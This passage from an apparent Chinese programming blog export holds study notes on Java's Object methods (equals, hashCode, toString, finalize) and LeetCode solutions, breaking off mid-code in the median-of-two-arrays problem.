    <url>/2022/09/14/24-Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)%E2%80%94%E2%80%94object%E7%B1%BB%E8%AF%A6%E8%A7%A3%20/</url>
    <content><![CDATA[<h1 id="Object类详解"><a href="#Object类详解" class="headerlink" title="Object类详解"></a>Object类详解</h1><h2 id="equals方法"><a href="#equals方法" class="headerlink" title="equals方法"></a>equals方法</h2><h3 id="x3D-x3D-与equals对比"><a href="#x3D-x3D-与equals对比" class="headerlink" title="&#x3D;&#x3D;与equals对比"></a>&#x3D;&#x3D;与equals对比</h3><p>&#x3D;&#x3D;是一个比较运算符，并不是一个方法。</p>
<ul>
<li>&#x3D;&#x3D;：既可以判断基本类型，也可以判断引用类型</li>
<li>&#x3D;&#x3D;：如果判断基本类型，判断的是值是否相等。例：int i &#x3D;10；double d &#x3D; 10.0</li>
<li>&#x3D;&#x3D;：如果判断引用类型，判断的是地址是否相等，即判断是否为同一个对象</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.object_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Equals01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">B</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line">        <span class="type">B</span> <span class="variable">c</span> <span class="operator">=</span> b;</span><br><span class="line">        <span class="type">B</span> <span class="variable">d</span> <span class="operator">=</span> c;</span><br><span class="line">        System.out.println(b == c);<span class="comment">//true</span></span><br><span class="line">        System.out.println(d == c);<span class="comment">//true</span></span><br><span class="line">        <span class="type">A</span> <span class="variable">aObj</span> <span class="operator">=</span> b;</span><br><span class="line">        System.out.println(aObj == d);<span class="comment">//true，因为地址还是相同的</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span>&#123;&#125;<span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br></pre></td></tr></table></figure>

<ul>
<li>equals：是Object类中的方法，<span style='color:red'>只能判断引用类型  </span>。查看源码</li>
<li>默认判断的是地址是否相等，子类中往往重写该方法，用于判断是否值相等。比如Integer、String【查看两个类中的equals方法源码】</li>
</ul>
<span id="more"></span>

<h3 id="子类重写equals方法"><a href="#子类重写equals方法" class="headerlink" title="子类重写equals方法"></a>子类重写equals方法</h3><p>默认判断的是地址是否相等，子类中往往重写该方法，用于判断是否值相等。<span style='color:red'>比如Integer、String</span>。</p>
<p>下面例子jdk版本：18.01 </p>
<h4 id="Object类中的equals方法："><a href="#Object类中的equals方法：" class="headerlink" title="Object类中的equals方法："></a>Object类中的equals方法：</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span> == obj);<span class="comment">//只有一个判断引用（地址）是否相等</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="String里面equals源码："><a href="#String里面equals源码：" class="headerlink" title="String里面equals源码："></a>String里面equals源码：</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object anObject)</span> &#123;</span><br><span class="line">    <span class="comment">//把Object的equals方法重写了，变成了比较两个字符串值是否相等</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span> == anObject) &#123;<span class="comment">//如果是同一个对象</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//直接返回true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (anObject <span class="keyword">instanceof</span> String aString)<span class="comment">//前置判断：必须是String类型，否则肯定不相等</span></span><br><span class="line">            &amp;&amp; (!COMPACT_STRINGS || <span class="built_in">this</span>.coder == aString.coder)</span><br><span class="line">      <span class="comment">//coder方法其实就是获取字符串采用的编码方式，如果编码方式都不一样，肯定结果为false</span></span><br><span class="line">      <span class="comment">//根据数据是否是压缩数据，采用不同的比较方式</span></span><br><span class="line">      <span class="comment">//数据压缩弃了高八位，一个八位就只占据一个byte数组位</span></span><br><span class="line">      <span class="comment">//如果是非压缩版，一个字符对应两个byte数组位</span></span><br><span class="line">            &amp;&amp; StringLatin1.equals(value, aString.value);</span><br><span class="line">  		<span class="comment">//三个条件都相等（是String、编码方式一样、内容一样）则返回true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Integer里面equals源码："><a href="#Integer里面equals源码：" class="headerlink" title="Integer里面equals源码："></a>Integer里面equals源码：</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Integer) &#123;<span class="comment">//判断是否为integer</span></span><br><span class="line">        <span class="keyword">return</span> value == ((Integer)obj).intValue();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="equals和-x3D-x3D-比较例子"><a href="#equals和-x3D-x3D-比较例子" class="headerlink" title="equals和&#x3D;&#x3D;比较例子"></a>equals和&#x3D;&#x3D;比较例子</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">integer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">integer1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">1000</span>);</span><br><span class="line">System.out.println(integer == integer1);<span class="comment">//false，两个对象地址不同</span></span><br><span class="line">System.out.println(integer.equals(integer1));<span class="comment">//true，值相同</span></span><br><span class="line">System.out.println(integer.intValue() == integer1.intValue());<span class="comment">//true，值相同</span></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">System.out.println(str1 == str2);<span class="comment">//false，地址不同</span></span><br><span class="line">System.out.println(str1.equals(str2));<span class="comment">//true，值相同</span></span><br></pre></td></tr></table></figure>

<h3 id="自己重写equals方法"><a href="#自己重写equals方法" class="headerlink" title="自己重写equals方法"></a>自己重写equals方法</h3><blockquote>
<p>应用实例：判断两个Person对象的内容是否相等，如果两个Person对象的各个属性值都一样，则返回true，反之false  </p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.object_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EqualsExercise01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;jack&quot;</span>, <span class="number">10</span>, <span class="string">&#x27;男&#x27;</span>);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;jack&quot;</span>, <span class="number">10</span>, <span class="string">&#x27;男&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(person.equals(person1));<span class="comment">//重写前：返回假，因为用的是Object类里面的equals方法，只判断是否为同一个对象，即地址是否相同</span></span><br><span class="line">        System.out.println(person.equals(person1));<span class="comment">//重写后：true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">char</span> gender;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age, <span class="type">char</span> gender)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//重写Object的equals方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">        <span class="comment">//判断如果比较的两个对象是同一个对象则直接返回true</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span> == obj)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//类型判断</span></span><br><span class="line">        <span class="keyword">if</span>(obj <span class="keyword">instanceof</span> Person)&#123;<span class="comment">//如果类是Person我们才比较</span></span><br><span class="line">            <span class="comment">//进行 向下转型，因为我需要得到obj的各个属性，如果不向下转型，对象无法使用其属性，编译类型为Object</span></span><br><span class="line">            <span class="type">Person</span> <span class="variable">obj1</span> <span class="operator">=</span>(Person)obj;</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">this</span>.age == obj1.age)&amp;&amp;(<span class="built_in">this</span>.name == obj1.name)&amp;&amp;(<span class="built_in">this</span>.gender == obj1.gender);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="hashcode方法"><a href="#hashcode方法" class="headerlink" title="hashcode方法"></a>hashcode方法</h2><p>hashcode()：返回该对象的哈希码值。支持此方法是为了提高哈希表（例如java.util.Hashtable提供的哈希表）的功能。</p>
<p>实际上，有Object类定义的hashcode方法确实会针对不同的对象返回不同的整数。（这一般是通过将该对象的内部地址转换成一个整数来实现的，但是Java编程语言不需要这种实现技巧。因为Java本身是跑在虚拟机上的，是无法拿到对象的真正地址的，像更底层的语言C、C++是可以的。）</p>
<h3 id="五个小结"><a href="#五个小结" class="headerlink" title="五个小结"></a>五个小结</h3><ul>
<li>（1）提高具有哈希结构的容器的效率</li>
<li>（2）两个引用，如果指向的是同一个对象，则哈希值肯定是一样的！</li>
<li>（3）两个引用，如果指向的是不同对象，则哈希值是不一样的！（不是绝对的，因为可能会产生哈希碰撞）</li>
<li>（4）哈希值主要根据地址号来的！不能完全将哈希值等价于地址。</li>
<li>（5）后面在集合中，hashcode如果需要的话，也会重写，如何重写可以看后面笔记。</li>
</ul>
<h2 id="toString方法"><a href="#toString方法" class="headerlink" title="toString方法"></a>toString方法</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><ul>
<li>返回对象的字符串表示。默认返回：全类名（包名+类名）+@+哈希值的十六进制（通过hashcode得到的一个整数转换成16进制）。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Object类中toString方法源码</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">//getClass().getName():类的全类名（包名+类名）</span></span><br><span class="line">  <span class="comment">//nteger.toHexString(hashCode())：将对象的hashcode值转成一个16进制字符串</span></span><br><span class="line">    <span class="keyword">return</span> getClass().getName() + <span class="string">&quot;@&quot;</span> + Integer.toHexString(hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>子类往往重写toString方法，用于返回对象的属性信息。</p>
</li>
<li><p>当直接输出一个对象时，toString方法会被默认的调用。比如System.out.println(monster)，就会默认调用monster.toString()</p>
</li>
</ul>
<h3 id="重写toString方法"><a href="#重写toString方法" class="headerlink" title="重写toString方法"></a>重写toString方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.object_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">toString_</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Monster</span> <span class="variable">monster</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Monster</span>(<span class="string">&quot;jk&quot;</span>, <span class="string">&quot;巡山&quot;</span>, <span class="number">1000</span>);</span><br><span class="line">        System.out.println(monster.toString());</span><br><span class="line">        <span class="comment">// 当直接输出一个对象时，toString方法会被默认的调用</span></span><br><span class="line">        System.out.println(monster);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Monster</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String job;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> sal;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;<span class="comment">//重写后，一般是把对象的属性值输出</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Monster&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, job=&#x27;&quot;</span> + job + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, sal=&quot;</span> + sal +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Monster</span><span class="params">(String name, String job, <span class="type">double</span> sal)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.job = job;</span><br><span class="line">        <span class="built_in">this</span>.sal = sal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="finalize方法"><a href="#finalize方法" class="headerlink" title="finalize方法"></a>finalize方法</h2><h3 id="基本介绍-1"><a href="#基本介绍-1" class="headerlink" title="基本介绍"></a>基本介绍</h3><blockquote>
<p>当垃圾回收器确定不存在对该对象的更多引用时，由对象的垃圾回收器调用此方法。</p>
</blockquote>
<ul>
<li><p>当对象被回收时，系统自动调用该对象的finalize方法。子类可以重写该方法，做一些<span style='color:orange'>释放资源</span>的操作。</p>
</li>
<li><p>什么时候被回收：当某个对象没有任何引用时，则jvm就认为该对象是一个垃圾对象，就会使用垃圾回收机制来销毁该对象，在销毁该对象前，会先调用finalize方法。</p>
</li>
<li><p>垃圾回收机制的调用，是由系统来决定，也可以通过System.gc()主动出发垃圾回收机制。</p>
</li>
<li><p><span style='color:orange'>实际开发中，几乎不会运用finalize，所以更多是为了面试&#x3D; &#x3D;</span></p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.object_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Finalize_</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">car</span> <span class="variable">audi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">car</span>(<span class="string">&quot;audi&quot;</span>);</span><br><span class="line">        audi = <span class="literal">null</span>;<span class="comment">//这时car对象就是一个垃圾，垃圾回收器就会回收对象</span></span><br><span class="line">        <span class="comment">//在销毁对象前，会调用该对象的finalize方法，程序员就可以在finalize中，写自己的业户逻辑代码（比如释放资源：数据库连接，或者打开文件...）</span></span><br><span class="line">        <span class="comment">//注意：这里car对象的回收不是实时的，不是一变成垃圾就回收，有自己的算法。我们可以通过主动调用垃圾回收器来执行</span></span><br><span class="line">        System.gc();<span class="comment">//运行垃圾回收器</span></span><br><span class="line">        System.out.println(<span class="string">&quot;程序结束&quot;</span>);</span><br><span class="line">        <span class="comment">//不过这里会不会出发finalize方法也是看运气的= =，至少jdk18一直输出不了finalize中的语句</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">car</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="built_in">super</span>.finalize();<span class="comment">//从9开始已经过时了</span></span><br><span class="line">        System.out.println(<span class="string">&quot;销毁汽车&quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">car</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 热题 HOT 100（一）</title>
    <url>/2022/09/29/30-LeetCode%20%E7%83%AD%E9%A2%98%20HOT%20100%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>leetcode恢复刷题，十月底之前尽量完成这部分…该部分只简单记录部分关键思路以及代码，帮助回顾～</p>
<h1 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a><a href="https://leetcode.cn/problems/two-sum/">1. 两数之和</a></h1><blockquote>
<p>给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target  的那 两个 整数，并返回它们的数组下标。</p>
<p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p>
<p>你可以按任意顺序返回答案。</p>
</blockquote>
<h2 id="思路：HashMap"><a href="#思路：HashMap" class="headerlink" title="思路：HashMap"></a>思路：HashMap</h2><p>由于还需要返回数组下标，所以存的时候肯定还要存数组下标，那就需要存一个键值对。这种情况直接考虑HashMap～</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer,Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; nums.length ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(target - nums[i]))&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> map.get(target - nums[i]);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;i,j&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(nums[i],i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h1 id="2-两数相加"><a href="#2-两数相加" class="headerlink" title="2. 两数相加"></a><a href="https://leetcode.cn/problems/add-two-numbers/">2. 两数相加</a></h1><blockquote>
<p>给你两个 非空 的链表，表示两个非负的整数。它们每位数字都是按照 逆序 的方式存储的，并且每个节点只能存储 一位 数字。</p>
<p>请你将两个数相加，并以相同形式返回一个表示和的链表。</p>
<p>你可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入：l1 = [2,4,3], l2 = [5,6,4]</span><br><span class="line">输出：[7,0,8]</span><br><span class="line">解释：342 + 465 = 807.</span><br></pre></td></tr></table></figure>

<h2 id="思路：直接模拟"><a href="#思路：直接模拟" class="headerlink" title="思路：直接模拟"></a>思路：直接模拟</h2><p>这题可以直接模拟做出来，看了一个赞比较多的模拟方法，可以学习下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> pre;</span><br><span class="line">        <span class="type">int</span> <span class="variable">carry</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//进位</span></span><br><span class="line">        <span class="keyword">while</span>(l1 != <span class="literal">null</span> || l2 != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> l1 == <span class="literal">null</span>?<span class="number">0</span>:l1.val;<span class="comment">//判断当前l1是否为空，是的话值为0</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> l2 == <span class="literal">null</span>?<span class="number">0</span>:l2.val;<span class="comment">//判断当前l2是否为空，是的话值为0</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> x + y + carry;<span class="comment">//当前节点和</span></span><br><span class="line"></span><br><span class="line">            carry = sum/<span class="number">10</span>;<span class="comment">//判断是否有进位s</span></span><br><span class="line">            sum = sum %<span class="number">10</span>;<span class="comment">//添加到新链表的值</span></span><br><span class="line">            cur.next = <span class="keyword">new</span> <span class="title class_">ListNode</span>(sum);</span><br><span class="line"></span><br><span class="line">            cur = cur.next;<span class="comment">//更新节点指针位置</span></span><br><span class="line">            <span class="keyword">if</span>(l1 != <span class="literal">null</span>)&#123;<span class="comment">//如果当前节点不为空，则一起更新，否则不更新</span></span><br><span class="line">                l1 = l1.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(l2 != <span class="literal">null</span>)&#123;</span><br><span class="line">                l2 = l2.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(carry == <span class="number">1</span>)&#123;<span class="comment">//最后再判断一次是否有进位</span></span><br><span class="line">            cur.next = <span class="keyword">new</span> <span class="title class_">ListNode</span>(carry);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pre.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="3-无重复字符的最长子串"><a href="#3-无重复字符的最长子串" class="headerlink" title="3. 无重复字符的最长子串"></a><a href="https://leetcode.cn/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a></h1><blockquote>
<p>给定一个字符串 <code>s</code> ，请你找出其中不含有重复字符的 <strong>最长子串</strong> 的长度。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入: s = <span class="string">&quot;abcabcbb&quot;</span></span><br><span class="line">输出: 3 </span><br><span class="line">解释: 因为无重复字符的最长子串是 <span class="string">&quot;abc&quot;</span>，所以其长度为 3。</span><br></pre></td></tr></table></figure>

<h2 id="思路：滑动窗口-哈希表"><a href="#思路：滑动窗口-哈希表" class="headerlink" title="思路：滑动窗口+哈希表"></a>思路：滑动窗口+哈希表</h2><p>用两个指针维护一个滑动窗口就可以解决问题，但这里写的时候遇到一个难点在于：更新left指针的时候要判断哈希表中获得的重复字符串位置可能在已经更新的left之前，这个时候就不用更新了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(s.length()==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        Map&lt;Character,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Character,Integer&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span> ;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span> ; right &lt; s.length() ; right++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(s.charAt(right)))&#123;</span><br><span class="line">                left = Math.max(left,map.get(s.charAt(right))+<span class="number">1</span>);</span><br><span class="line">              <span class="comment">//更新窗口的起始位置，当然要根据该命中的字符上一次出现的索引与当前窗口起始位置做比较，取最大值</span></span><br><span class="line">            &#125;</span><br><span class="line">            map.put(s.charAt(right),right);<span class="comment">//更新k-v，会覆盖掉原来contain元素的那个下标</span></span><br><span class="line">            ans = Math.max(ans,right-left+<span class="number">1</span>);<span class="comment">//更新最大长度</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="4-寻找两个正序数组的中位数"><a href="#4-寻找两个正序数组的中位数" class="headerlink" title="4. 寻找两个正序数组的中位数"></a><a href="https://leetcode.cn/problems/median-of-two-sorted-arrays/">4. 寻找两个正序数组的中位数</a></h1><blockquote>
<p>给定两个大小分别为 m 和 n 的正序（从小到大）数组 nums1 和 nums2。请你找出并返回这两个正序数组的 中位数 。</p>
<p>算法的时间复杂度应该为 O(log (m+n)) 。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [1,3], nums2 = [2]</span><br><span class="line">输出：2.00000</span><br><span class="line">解释：合并数组 = [1,2,3] ，中位数 2</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：二分法"><a href="#思路：二分法" class="headerlink" title="思路：二分法"></a>思路：二分法</h2><p><a href="https://leetcode.cn/problems/median-of-two-sorted-arrays/solution/xiang-xi-tong-su-de-si-lu-fen-xi-duo-jie-fa-by-w-2/">详细思路题解</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">double</span> <span class="title function_">findMedianSortedArrays</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums1.length;</span><br><span class="line">    <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> nums2.length;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> (n + m + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> (n + m + <span class="number">2</span>) / <span class="number">2</span>;</span><br><span class="line">    <span class="comment">//将偶数和奇数的情况合并，如果是奇数，会求两次同样的 k 。</span></span><br><span class="line">    <span class="keyword">return</span> (getKth(nums1, <span class="number">0</span>, n - <span class="number">1</span>, nums2, <span class="number">0</span>, m - <span class="number">1</span>, left) + getKth(nums1, <span class="number">0</span>, n - <span class="number">1</span>, nums2, <span class="number">0</span>, m - <span class="number">1</span>, right)) * <span class="number">0.5</span>;  </span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getKth</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span> start1, <span class="type">int</span> end1, <span class="type">int</span>[] nums2, <span class="type">int</span> start2, <span 